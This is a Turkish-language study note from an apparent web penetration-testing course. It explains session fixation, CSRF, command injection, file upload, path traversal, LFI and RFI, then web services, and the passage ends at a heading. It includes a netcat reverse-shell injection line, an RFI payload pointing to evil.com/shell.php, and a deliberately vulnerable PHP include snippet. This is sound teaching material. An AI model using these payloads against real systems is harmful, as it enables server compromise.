Session fixation, bir saldırganın bir kullanıcının oturum kimliğini (session token) kendisinin belirlediği bilinen bir değere _sabitlediği_ (set ettiği) bir web uygulaması saldırısıdır. Ardından saldırgan, kurbanı bu sabitlenmiş oturum kimliğini kullanarak giriş yapmaya ikna eder. Kurban giriş yaptığında sunucu bu oturum kimliğini doğrulanmış kullanıcıyla ilişkilendirirse, saldırgan aynı session ID ile kurbanın oturumuna yetkisiz erişim sağlayabilir.

**Kısa örnek:** Saldırgan `PHPSESSID=attacker123` gibi bir ID oluşturur ve kurbanı bu ID’yi taşıyan özel bir bağlantıya tıklatır; kurban siteye giriş yaparsa saldırgan aynı ID ile oturuma girebilir.
## CSRF(Cross-Site Request Forgery):

Cross-Site Request Forgery (CSRF), bir web güvenliği zafiyetidir ve saldırganın, bir kullanıcıyı **haberi veya izni olmadan bir web uygulamasında belirli işlemleri yapmaya kandırması** sonucu ortaya çıkar.
==Bu saldırı, **web uygulamasının kullanıcının tarayıcısına duyduğu güveni kötüye kullanır**. Yani, kullanıcı daha önce giriş yaptığı bir siteye saldırgan tarafından yönlendirilmiş bir istek gönderildiğinde, uygulama bu isteğin gerçekten kullanıcıdan geldiğini zannedebilir.==
Web uygulaması sızma testleri kapsamında CSRF’nin anlaşılması, bu tür güvenlik risklerini **doğru şekilde tespit etmek ve önlem almak** açısından oldukça önemlidir.

Bir **CSRF saldırısında**, saldırgan kötü niyetli bir isteği özel olarak hazırlar ve kullanıcıyı bu isteği farkında olmadan **zafiyet içeren web uygulamasına göndermeye kandırır**.
Web uygulamaları genellikle, kullanıcının tarayıcısından gelen isteklerin **meşru ve kullanıcıya ait olduğunu varsayar**.  CSRF saldırısı, bu güveni istismar eder.

Çoğu web uygulaması **kullanıcı kimlik doğrulaması için çerezleri (cookies)** kullanır. Kullanıcı giriş yaptığında, oturum boyunca onu tanımlayan bir **oturum çerezi (session cookie)** oluşturulur. Bu çerez, uygulamaya yapılan her istekte **tarayıcı tarafından otomatik olarak gönderilir** — işte saldırganlar bu davranışı kendi lehlerine kullanır.

*Saldırı adımları: 

- Saldırgan, kullanıcının e-posta adresini veya parolasını değiştirmek gibi kötü amaçlı bir isteği hazırlar ve bunu bir web sayfasına, e-postaya veya başka bir içerik biçimine gömer.
- Saldırgan, kurbanı hedef web uygulamasında **oturum açmış**ken bu içeriği yüklemeye ikna eder.
- Kurbanın tarayıcısı, kurbanın kimlik doğrulama çerezi (session cookie) dahil olmak üzere bu kötü amaçlı isteği otomatik olarak gönderir.
- Web uygulaması, isteği kimlik doğrulama çerezine dayanarak güvenilir kabul eder ve isteği işler; bunun sonucunda kurbanın hesabı ele geçirilebilir veya değiştirilir.

Aşağıdaki gibi hazırlanmış bir htmli, sistemde oturum açmış bir admin tarafından tıklandığı zaman ikinci görseldeki gibi MySQL ayarlarını değiştirecektir.

![[Pasted image 20251010120811.png]]

![[Pasted image 20251010120745.png]]

Saldrıganın belirlediği bilgilere göre CSRF içeren linke tıklayan kurban veritabanı ayarları otomatik olarka yerleştirildiğini ve istek gönderildiğini görecektir uygulamamızda. 
Detayları içeren [bağlantı](https://assets.ine.com/labs/ad-manuals/walkthrough-323.pdf?_gl=1*1o3m98b*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuNjgzMTkzMTQuMTc1ODk4NTMzNC4xNzU4OTg1MzM1*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjAwODc0NTckbzU1JGcxJHQxNzYwMDg3NDU3JGo2MCRsMCRoMjAyMTE0NzI.).
## Injection & Input Validation | Command Injection :

Web uygulaması sızma testleri bağlamında **komut enjeksiyonu (command injection)** zafiyeti, saldırganın bir web uygulamasının giriş alanlarını manipüle ederek **altyapıdaki sunucuda rastgele işletim sistemi komutları çalıştırabilmesine** olanak tanıdığı durumlardır.

Bu tür bir zafiyet ciddi bir güvenlik riski taşır; yetkisiz erişime, veri hırsızlığına ve web sunucusunun **tam ele geçirilmesine** yol açabilir.

*Nedenleri:*

- **Kullanıcı Girdi İşleme:** Web uygulamaları genellikle formlar, sorgu parametreleri veya diğer yollarla kullanıcı girdisi alır.
- **Girdi Temizleme Eksikliği:** Güvensiz yazılmış uygulamalar, kullanıcı girdilerini sistem komutlarında kullanmadan önce uygun şekilde doğrulamayabilir, temizlemeyebilir veya kaçış (escape) işlemine tabi tutmayabilir.
- **Enjeksiyon Noktaları:** Saldırganlar, kötü amaçlı komutları yerleştirebilecekleri giriş alanları veya URL sorgu parametreleri gibi enjeksiyon noktalarını tespit ederler. Bu bir web app geliştirme dili gibi (php) kodları olabileceği gibi  işletim sistemi komutları da olabilir.

Web uygulamaları kullanıcıdan gelen verilere güveniyorsa ve bu verileri doğrudan işletim sistemi komutlarında kullanıyorsa, saldırganlar bu giriş noktalarına zararlı komutlar sokarak sunucuda istenmeyen kod çalıştırabilir. Bunu önlemek için tüm girdiler doğrulanmalı, temizlenmeli/escape edilmeli ve mümkünse sistem komutları doğrudan kullanıcı girdileriyle birleştirilmemelidir; ayrıca en az ayrıcalık ilkesi ve güvenli kütüphaneler kullanılmalıdır.

Tıpkı SQLi’de olduğu gibi, Command Injection da **kör (blind)** olabilir; yani sunucunun döndürdüğü yanıtı doğrudan göremeyiz. Böyle bir durumda, sunucudan etkileşimli komut çıktısı almak için **netcat (netcat -e / reverse shell)** ile ters bağlantı (reverse shell) kurmaya çalışmak veya çıktıyı dışarıya iletmek için **DNS/HTTP tabanlı OOB (out-of-band) kanalları** kullanmak gibi yöntemler denenebilir.

Dosya yüklememize izin veren bir alana  dosya adından sonra `nc 192.169.156.2 4444` gibi bir komut injeksiyonu yapılmıştır. Görüldüğü gibi sayfa bir yanıt dönmüyor ki bu blind command injectionu kanıtlar nitelikte olabilir.

![[Pasted image 20251010125137.png]]

![[Pasted image 20251010125326.png]]

Saldırgan yukarıdaki gibi bir shell almıştır.

# File & Resource Attacks(WPT):

*Kurs Başlıkları(Topics):*

- Introduction To Arbitrary File Upload  Vulnerabilities  
- Bypassing File Upload Extension Filters  
- Bypassing PHPx Blacklists  
- Introduction To Directory/Path Traversal  Vulnerabilities  
- Identifying & Exploiting Directory/Path Traversal   Vulnerabilities
- Introduction to LFI & RFI  Vulnerabilities
- Identifyin & Exploitinfg LFI RFI Vulberabilities
## Arbitrary File Upload Vulnerabilities:

**Keyfi Dosya Yükleme (Arbitrary File Upload)** zafiyeti, web uygulamalarında görülen bir güvenlik açığı türüdür. Bu zafiyet, bir saldırganın **sunucuya kötü amaçlı dosyalar yüklemesine ve çalıştırmasına** olanak tanır.

Bu durum; **yetkisiz veri erişimi**, **sunucunun ele geçirilmesi** ve hatta **sistemin tamamen kontrol altına alınması** gibi ciddi sonuçlara yol açabilir.

Zafiyetin temel nedeni, uygulamanın yüklenen dosyaları **doğru şekilde doğrulamaması ve güvenli biçimde işleyememesidir**. Yani uygulama, yüklenen dosyanın gerçekten beklenen türde (örneğin yalnızca bir resim veya PDF dosyası) olup olmadığını kontrol etmeyebilir veya dosyanın **sunucuda nerede saklanacağını ve çalıştırılıp çalıştırılamayacağını kısıtlamayabilir**.

**Sömürme (Exploitation):** Saldırgan, hedef uygulamadaki dosya yükleme işlevini tespit eder ve kötü amaçlı bir dosya yüklemeye çalışır. Bu dosya, PHP betikleri, shell komutları veya zararlı yazılımlar gibi kötü niyetli kodlar içerecek şekilde hazırlanabilir.

**Doğrulamayı Atlatma (Bypassing Validation):** Uygulama dosya türlerini doğru şekilde doğrulamıyor veya dosya konumlarını kısıtlamıyorsa, saldırgan yanıltıcı uzantı kullanarak (ör. gerçek bir PHP dosyasını `resim.jpg` veya `shell.php.jpg` gibi göstermek) dosyayı yükleyebilir.,

*Impact:*
- **Uzaktan Kod Çalıştırma (Remote Code Execution):** Kötü amaçlı dosya yüklendikten ve çalıştırıldıktan sonra sunucuda uzaktan kod çalıştırmaya yol açabilir. Bu, saldırganın **istediği kodu çalıştırabilmesi** ve potansiyel olarak **sunucuyu ele geçirebilmesi** demektir.
- **Veri Sızdırma (Data Exfiltration):** Saldırgan bu erişimi kullanarak **hassas verileri çalabilir**, **veritabanı kayıtlarını değiştirebilir** veya sunucu üzerinde başka kötü amaçlı işlemler gerçekleştirebilir.

==*1)* Bu bağlantıya [tıklayarak](https://assets.ine.com/labs/ad-manuals/walkthrough-200.pdf?_gl=1*15lih9y*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuNzM0Nzg4MjE4LjE3NjA0NTgwMjUuMTc2MDQ1ODAyNg..*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjA1MTUxNjkkbzYwJGcxJHQxNzYwNTE4MTcyJGo0NyRsMCRoOTQyNjQ5MDY1) lab örneğine ve çözüme ulaşabilirsiniz.,==

*NOT:*  ==/usr/share/webshells dizini altında  süreç boyunca faydalanmamız gerekebilecek webshell betikleri vardır==. (php, asp vb.)
Örneğin, aşağıda php shell betikleri gözükmektedir:

![[Pasted image 20251015120219.png]]

- **Uzantı beyaz listesi**: Sadece `.jpg`, `.png`, `.pdf` vb. izin ver. (blacklist güvensizdir)
- **MIME tipi kontrolü**: `Content-Type` header'ına bakmak yeterli değil ama sunucu tarafında doğrulanmalı.
- **Magic bytes (file signature) kontrolü**: Dosyanın ilk birkaç byte'ına bakarak gerçek tipini doğrula (ör. PNG `89 50 4E 47`).
- **Dosya boyutu limiti**: Maksimum boyut belirle (`max file size`) ve sunucuda da enforce et.

Burp Suite kullanarak bypassing işlemleri uygulanabilir.
shell.php dosyası shell.jpg olarak karşıya yüklenirse bypassing işlemi tamamlanmış olur ancak bu sefer OS bu dosyayı .jpg olarak yorumlayacaktır. Tekrar .php olarak yorumlanması gerekmektedir. .php olarak yorumlanmasını enforce etmemiz gerekecektir

Burada **weevly** aracına da değinebiliriz:

Weevely, PHP tabanlı **küçük ama güçlü bir web shell / remote administration aracıdır**. Genelde güvenlik araştırmacıları, penetrasyon testçileri v uzak bir sunucuda komut çalıştırmak, dosya yönetimi yapmak veya ters bağlantı (reverse shell/tunneling) kurmak için kullanılır.

Özellikler:
- İnteraktif komut kabuğu (PHP üzerinden komut çalıştırma).
- Dosya yönetimi (yükle/indir/okuma/yazma).
- Veritabanı sorguları çalıştırma imkânı.
- Port forwarding / proxy / ters tünel benzeri işlevler.
- ==Şifrelenmiş/obfuskate edilmiş payload oluşturma (bu sayede dosya bulunsa bile anlamlandırılmayacaktır).== 
- Küçük ve taşınabilir; tek bir PHP dosyası olarak çalışır.

Weevely tipik olarak tek bir PHP dosyası (web shell) üretir; bu dosyada erişim için bir “parola”/şifre yer alır.

![[Pasted image 20251015154043.png]]

==*2)* Bu bağlantıya [tıklayarak](https://assets.ine.com/labs/ad-manuals/walkthrough-208.pdf?_gl=1*thd8cq*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuNzM0Nzg4MjE4LjE3NjA0NTgwMjUuMTc2MDQ1ODAyNg..*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjA1MzIxMzgkbzYyJGcxJHQxNzYwNTMyMjE1JGo2MCRsMCRoMjEwMjY0MDU5Mw..) ikinci örneğe bakabiliriz.==

==*3.*) Bu bağlantıya [tıklayarak](https://assets.ine.com/labs/ad-manuals/walkthrough-201.pdf?_gl=1*14fyvjq*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuNzM0Nzg4MjE4LjE3NjA0NTgwMjUuMTc2MDQ1ODAyNg..*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjA4NzEzNTkkbzY3JGcxJHQxNzYwODcyNDAxJGo2MCRsMCRoMzI1MjkwNjI0) üçüncü örneğe bakabiliriz.==

Yukarıdaki 3. örnekjte hedef sunucu, keyfi dosya yükleme ve çalıştırma güvenlik açığına karşı düzgün şekilde korunmamıştır. Yönetici kara liste (blacklisting) yaklaşımı kullanmış ancak diğer çalıştırılabilir dosya uzantılarını bu listeye eklemeyi unutmuştur. ==Bu örnek aynı zamanda kara listelemenin neden iyi bir güvenlik önlemi olarak görülmediğini de kanıtlamaktadır.==

==*4.*) Wordpress ile ikgili örneğe bu bağlantıya [tıklayarak](https://assets.ine.com/labs/ad-manuals/walkthrough-471.pdf?_gl=1*e1hscj*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuNzM0Nzg4MjE4LjE3NjA0NTgwMjUuMTc2MDQ1ODAyNg..*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjA4NzEzNTkkbzY3JGcxJHQxNzYwODc0NjgxJGozNyRsMCRoMzI1MjkwNjI0) erişilebilir.==

Dördüncü örnekten görüyoruz ki bir Arbitrary File Upload Vulnerabilities'dan faydalanmak için form gibi bir yapıya ihtiyacaımız yok. Bu  lab örneğinde curl üzerinden post işlemiyle yükleme yapılmıştır.,
## Directory/Path Traversal:

Directory traversal zafiyetleri, path traversal veya directory climbing (dizin tırmanma) olarak da bilinen bu güvenlik açıkları, bir web uygulamasının yetkisiz kullanıcılara amaçlanan veya yetkilendirilmiş dizin yapısının dışındaki dosya ve dizinlere erişim izni vermesi durumunda ortaya çıkan bir güvenlik zaafiyeti türüdür.
Directory traversal zafiyetleri, eğer ele alınmaz veya önlem alınmazsa ciddi veri ihlallerine ve sistem güvenliğinin tehlikeye girmesine yol açabilir.

- `../` (Unix/Linux sistemlerinde üst dizine çıkma)
- `..\` (Windows sistemlerinde üst dizine çıkma)

*Hatalı Girdi İşleme (Improper Input Handling)*
Directory traversal zafiyetleri genellikle kullanıcı girdilerinin, özellikle dosya veya dizin yollarıyla ilgili girdilerin hatalı bir şekilde işlenmesinden kaynaklanır. Bu girdiler URL parametrelerinden, kullanıcı tarafından oluşturulan içeriklerden veya diğer kaynaklardan elde edilebilir.

*Saldırgan Manipülasyonu (Attacker Manipulation)*
Saldırgan, zayıf girdi doğrulama veya kullanıcı girdilerinin yetersiz temizlenmesinden (sanitization) yararlanır. Girdiyi özel karakterler veya karakter dizileri ekleyerek manipüle eder ve böylece uygulamayı, erişim yetkisi olmaması gereken dizinlere yönlendirecek şekilde kandırır.

*Dizin Yapısında Gezinme (Traversing Directory Structure)*
Saldırgan, girdi içerisine stratejik olarak `..` (nokta-nokta) veya buna eşdeğer dizin gezinme karakter dizilerini yerleştirerek dizin hiyerarşisinde yukarı doğru hareket edebilir. Her `..` ifadesi, dizin yapısında bir üst seviyeye çıkmak anlamına gelir. (Genellikle kök dizine gitmek için 3-6 arası geri gelmek yeterelidir)

*Hassas Dosyalara Erişim (Accessing Sensitive Files)*
Saldırgan dizinler arasında başarılı bir şekilde gezindikten sonra, uygulamanın amaçlanan kapsamı dışında kalan dosya ve dizinlere erişebilir ve potansiyel olarak bunları manipüle edebilir. Bu durum yapılandırma dosyalarını, kullanıcı verilerini, betikleri ve hatta sistem dosyalarını içerebilir.

## Local File Inclusion (LFI):

Local File Inclusion (LFI), bir uygulamanın web tarayıcısı aracılığıyla sunucudaki dosyaları dahil etmesine izin verdiği bir tür güvenlik açığıdır. Web uygulamalarında dosya dahil etme, genellikle betikler veya şablonlar gibi dışarıdaki dosyaların dinamik olarak bir web sayfasına eklenmesi uygulamasını ifade eder. Bu, dinamik ve modüler web uygulamaları oluşturmak için temel bir kavramdır. Bu güvenlik açığı tipik olarak bir uygulama, sunucudaki dosyaları almak veya görüntülemek için kullanıcı girdisini kullanmadan önce ==doğru şekilde doğrulamaz veya temizlemezse ortaya çıkar.== LFI ciddi sonuçlara yol açabilir; saldırganın hassas sistem dosyalarını okumasına, kötü amaçlı kod çalıştırmasına veya sunucuda yetkisiz erişim elde etmesine olanak tanıyabilir.

LFI güvenlik açıkları genellikle zayıf girdi doğrulaması veya web uygulamalarında uygun güvenlik mekanizmalarının eksikliğinden kaynaklanır.  
Saldırganlar, uygulama içinde dosya yollarını veya dosya adlarını belirtmek için kullanılan girdi parametrelerini manipüle ederek bu güvenlik açıklarından yararlanırlar.  
LFI güvenlik açıkları, bir web uygulamasının çeşitli bölümlerinde bulunabilir. Bunlar şunlardır:

- **Dosya Dahil Etme Fonksiyonları:** `include()`, `require()` veya `file_get_contents()` gibi, dosya yolları için kullanıcı tarafından kontrol edilen girdileri kabul eden fonksiyonlar.
- **HTTP Parametreleri:** Web formlarındaki girdi alanları veya URL’lerdeki sorgu parametreleri.
- **Çerezler (Cookies):** Uygulama, dahil edilecek dosyayı belirlemek için çerezleri kullanıyorsa.
- **Oturum Değişkenleri (Session Variables):** Eğer oturum verileri, dosya dahil etme işlemini kontrol etmek için manipüle edilebiliyorsa.

Local File Inclusion (LFI) ile Dizin/Yol Kaçışı (Directory/Path Traversal), dosya yollarını manipüle ederek ==bir sunucudaki dosyalara erişmeyi amaçlayan ilişkili fakat farklı güvenlik açıklarıdır==. Temel farklar şu şekildedir:

- **LFI (Local File Inclusion):** LFI saldırısının birincil amacı, sunucudaki bir dosyanın içeriğini ==web uygulamasının bağlamına== dahil etmek,görüntülemektir veya çalıştırmaktır. Buna hassas sistem dosyaları, yapılandırma dosyaları veya kullanıcı verileri dahil olabilir.
- **Dizin/Yol Kaçışı (Directory Traversal):** Dizin/yol kaçışının hedefi, dosya sisteminin dizin yapısını manipüle ederek amaçlanan dizin dışındaki dosya veya dizinlere erişmektir. Bu, LFI’ye yol açabilir; ancak yol kaçış saldırılarının amacı genellikle daha geniştir — dosyaları okumak, değiştirmek veya silmek gibi işlemleri gerçekleştirebilme yeteneğini sağlamaktır.

==Çoğu LFI istismarı, kullanıcı girdisine  ../../  benzeri yol kaçışı ekleyerek hangi dosyanın include/okunacağını değiştirmeye dayanır. Yani traversal, LFI’yi tetiklemek veya genişletmek için sıkça kullanılan bir yöntemdir. O yüzden sıklıkla birbirine karışırlar.==

*Saldırı Yöntemi*
**LFI:** LFI saldırıları genellikle saldırganın dosya yolunu girdi olarak belirleyebilmesine izin veren bir web uygulamasındaki zafiyetten yararlanmayı içerir. Saldırgan, uygulamayı dosyanın içeriğini dahil etmeye veya görüntülemeye kandırır.  
**Dizin/Yol Kaçışı:** Dizin/yol kaçışı saldırıları öncelikle göreli veya mutlak yolları manipüle ederek web uygulamasının amaçlanan kapsamı dışındaki dosya ve dizinlere erişmeyi hedefler. Bu, saldırganın amacına bağlı olarak dosya dahil edilmesiyle sonuçlanabilir de sonuçlanmayabilir.

 *Kapsam*
- **LFI:** LFI, saldırganın birincil amacının dosya dahil etmek olduğu belirli bir saldırı türüdür. Saldırı, bir parçası olarak dizin/yol kaçışı içerebilir veya içermeyebilir.
- **Dizin/Yol Kaçışı:** Dizin/yol kaçışı, saldırganın dosya sistemi içinde gezinmeyi amaçladığı daha geniş bir saldırı kategorisidir; bu durum LFI’ye yol açabilir, ayrıca hassas verilerin okunması veya rastgele komutların çalıştırılması gibi diğer saldırılara da zemin hazırlayabilir.

*RCE (Remote Code Execution) ve LFI ikilisi: 
- **Log poisoning (log enjeksiyonu)**
    - Uygulamanın erişim/log dosyalarına (Apache/nginx/PHP) attacker kontrollü metin (ör. User-Agent) yazılabiliyorsa; LFI ile o log dosyası `include` edilince PHP interpreter saldırganın yazdığı PHP kodunu çalıştırabilir.
    - Özet: _writeable veya append edilebilen_ bir dosyaya saldırgan kod enjekte et → LFI ile dahil et → kod yorumlanır.
- **File upload / upload poisoning**
    - Eğer uygulama dosya yüklemeye izin veriyorsa (ör. resim yükleme) ve yüklenen dosyalar webroot içinde tutuluyor ya da kolayca include edilebiliyorsa, saldırgan PHP içeren bir dosya yükleyip sonra LFI ile dahil edebilir.
    - Mitigasyon: yüklemeleri webroot dışında sakla, mimetype kontrolü ve dosya uzantı kontrolü tek başına yeterli değil.

LFI örnek lab çözümü için [tıkla](https://assets.ine.com/labs/ad-manuals/walkthrough-482.pdf?_gl=1*qvzz1o*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuMTMwNjI4MDc4LjE3NjA5NjYxOTMuMTc2MDk2NjE5NA..*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjE0MTY3ODAkbzgwJGcxJHQxNzYxNDE4MTQwJGo2MCRsMCRoMjA0MzkzOTM3Ng..).
## Remote File Inclusion (RFI):

RFI, bir web uygulamasının **uzaktaki bir URL** (ör. `http://evil.com/shell.txt`) içindeki içeriği kullanıcı kontrollü bir parametre ile **include/require** etmesine izin veren zafiyettir. Başka bir deyişle saldırgan, kendi sunucusundaki dosyayı hedef uygulamaya okutur — bu dosya PHP kodu içeriyorsa ve PHP yorumlayıcısı tarafından işlendiği bir bağlamda dahil edilirse **RCE (uzaktan kod çalıştırma)** elde edilebilir.

- **RFI**: include edilen kaynak **uzak URL** (`http://`, `ftp://` vb.). Genelde `allow_url_include = On` veya benzeri zafiyetli konfigürasyon gerekir.
- **LFI**: include edilen kaynak **sunucu içindeki yerel dosya** (`/etc/passwd`, `../../...`). RFI daha doğrudan remote kod enjeksiyonuna izin verebilir; LFI genelde dolaylı yollarla (log poisoning, upload, session) RCE'ye dönüşür.

*Nedenler:*

- Yetersiz Girdi Doğrulaması: Web uygulaması, kullanıcı girdilerini yeterince doğrulamayabilir veya filtrelemeyebilir; bu da saldırganların zararlı veri enjekte etmesine olanak tanır.  
- Uygun Temizlemenin Eksikliği: Girdi doğrulansa bile, uygulama dosya dahil etme işlemlerinde kullanmadan önce girdiyi yeterince temizlemeyebilir.  
- Dosya Yollarında Kullanıcı Girdisi Kullanımı: Kullanıcı girdisine dayalı olarak dinamik dosya dahil eden uygulamalar, bu girdiyi dikkatle doğrulayıp kontrol etmezlerse yüksek risk altındadır.  
- Güvenlik Kontrollerinin Uygulanmaması: Geliştiriciler dosya izinlerini doğru ayarlama veya web uygulama güvenlik duvarı (WAF) gibi güvenlik mekanizmalarını kullanma gibi en iyi uygulamaları göz ardı edebilirler.

*Nasıl çalışır (teknik özet)*

- Örnek kırılgan kod
 kullanıcı girdisi doğrudan include ediliyor 
`include $_GET['page'];`

- Saldırgan: `?page=http://evil.com/shell.php`
- Eğer `allow_url_include = On` ve sunucu `include` ile remote dosyayı çekip PHP olarak yorumluyorsa, `shell.php` içindeki PHP kodu çalışır → RCE.

RFI'a kapsamlı bir lab örneği için [tıkla](https://assets.ine.com/labs/ad-manuals/walkthrough-2124.pdf?_gl=1*wd1pvo*_gcl_aw*R0NMLjE3NTM5MDQ2MDAuQ2owS0NRandoYWZFQmhDY0FSSXNBRUdaRUtJeVlLTmM5c3dtM0J5ZFRlekphX0hOQUJpMDdhd3RrbDRack5uYjQ4X0ZhVkQ5ckVJVGV2OGFBaE1JRUFMd193Y0I.*_gcl_au*MzYzNTQ0Mzc5LjE3NTQ1Nzk4MjUuMTMwNjI4MDc4LjE3NjA5NjYxOTMuMTc2MDk2NjE5NA..*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjE0MjM0MTAkbzgxJGcxJHQxNzYxNDIzNDEwJGo2MCRsMCRoNjE5MDUxMjU1).
# Web Services(WPT):

*Kurs Başlıkları(Topics):*

- Introduction To Web Services
- Web Service Implementations
- WSDL Language Fundamentals
- Web Service Security Testing
- SOAP Web Service Security Testing
## Introduction Web Services:

Web servisleri, internet üzerinden farklı uygulamalar veya sistemler arasında **iletişim ve veri alışverişini kolaylaştırmak için tasarlanmış yazılım bileşenleridir.**  
==Bu servisler, **farklı platformlarda geliştirilmiş, farklı programlama dilleriyle yazılmış veya farklı sunucularda çalışan** uygulamaların bile  **birlikte uyumlu şekilde çalışmasını** sağlar.==
Web servisleri, teknolojik farklılıkları ortadan kaldırarak sistemlerin birbiriyle sorunsuz iletişim kurmasını sağlar.

Genellikle şu amaçlarla kullanılırlar:
- **Uygulamalar arası entegrasyonu sağlamak:**  
    Örneğin, **Uygulama A**, başka bir uygulamada bulunan(**Uygulama B** )belirli işlevleri (özellikleri) kullanabilir.
- **Bir uygulama içindeki bileşenleri ayırmak:**  
    Örneğin, **ön yüz (front-end)** tarafındaki betikler (scripts), web servislerin sunduğu işlevleri kullanarak **içeriği dinamik olarak güncelleyebilir.**

Web servisleri, internet üzerinden farklı yazılım sistemleri arasında **iletişim ve veri alışverişini kolaylaştırmak için tasarlandığını söylemiştik .**  
Bu servisler, genellikle **SOAP (Simple Object Access Protocol)** veya **REST (Representational State Transfer)** gibi protokoller kullanarak **farklı uygulamaların standart bir şekilde birbirleriyle etkileşim kurmasını** sağlar.  
==Web servisleri genellikle **makineden makineye iletişim (machine-to-machine communication)** amacıyla kullanılır ve **doğrudan insan etkileşimi** için tasarlanmamıştır.==

![[Pasted image 20251026234857.png]]

*Birlikte Çalışabilirlik (Interoperability):*
Web servisleri, uygulamaların **standart bir yöntemle iletişim kurmasını sağlayarak** birlikte çalışabilirliği (interoperability) destekler.  
**HTTP, XML, SOAP, REST ve JSON** gibi **açık standartlara** dayanarak, farklı sistemler arasında **uyumluluğu ve veri paylaşımını** mümkün kılar.

*Platformdan Bağımsızlık (Platform-agnostic):*
Web servisleri **belirli bir işletim sistemi veya programlama diline bağlı değildir.**  
Farklı teknolojiler kullanılarak geliştirilebilirler; bu da onları **esnek, çok yönlü ve farklı ortamlarda erişilebilir** hale getirir.

*Gevşek Bağlantı (Loose Coupling):*  
Web servisleri, sistemler arasında **gevşek bağlı (loosely coupled)** etkileşimlere olanak tanır.  
Bu, bir sistemin yapısında veya uygulamasında yapılan değişikliklerin, diğer sistemlerin **çalışmasını doğrudan etkilememesi** anlamına gelir.  
Yani sistemler birbirine sıkı sıkıya bağlı değildir; bu da bakım, güncelleme ve entegrasyonu kolaylaştırır.

*Konumdan Bağımsızlık (Location Independence):*  
Web servisleri **internet üzerinden çalıştıkları için konumdan bağımsızdır.**  
Farklı sunucularda barındırılabilirler ve **internet bağlantısı olan her yerden** erişilebilirler.

==*WEB SERVICES and API's:*==

Web geliştirme alanında **birbirine yakın ama farklı kavramlardır.**

**Web servisleri**, internet üzerinden **makineden makineye iletişim ve veri alışverişini** mümkün kılan  bir teknolojiyi  ifade eder.  
Bu servisler, çeşitli **protokol ve veri formatlarını** kapsar (örneğin SOAP, REST, XML, JSON gibi).

**API’ler** ise bir servis, uygulama veya platformun **verilerine ya da işlevlerine erişmek** için ==geliştiricilere sunulan **kurallar ve araçlar bütünüdür.**==  
==Yani API, web servislerinin sunduğu işlevlere **erişim sağlayan arabirim** olarak düşünülebilir.==

Web servisleri, internet üzerinden **farklı yazılım sistemleri arasında iletişim ve veri alışverişini kolaylaştırmak için tasarlanmış geniş bir teknoloji ve protokol grubudur.**  
Amaç, **farklı platformlarda çalışan** ve **farklı programlama dilleriyle geliştirilmiş** uygulamaların **standart bir yöntemle birbirleriyle etkileşime girmesini** sağlamaktır.

API’ler, geliştiricilerin **bir uygulamanın ya da servisin işlevlerine veya verilerine** kendi uygulamaları içinde **erişebilmesine ve bunları kullanabilmesine** olanak tanır.

![[Pasted image 20251027195106.png]]
## Web Services Implementations:

**Web Service Implementations**, web servislerinin uygulanması, bu servislerin **nasıl oluşturulduğu, dağıtıldığı (deployed)** ve **kullanıldığı** farklı yöntemleri ifade eder.  
Web servislerini geliştirmek ve çalıştırmak için kullanılabilecek **çeşitli yöntemler ve teknolojiler** bulunmaktadır.

*1. SOAP (Simple Object Access Protocol):*
SOAP, web servislerinin uygulanmasında **yapılandırılmış bilgilerin (structured information)** değişimi için kullanılan bir **iletişim protokolüdür.**  
SOAP tabanlı web servisleri, mesaj formatı olarak **XML** kullanır ve **çeşitli programlama dilleriyle** geliştirilebilir.  
Bu yapı, güvenlik ve standartlaşma açısından oldukça güçlüdür, ancak diğer yöntemlere göre daha **karmaşık ve ağır** olabilir.

*2.JSON-RPC ve XML-RPC:*
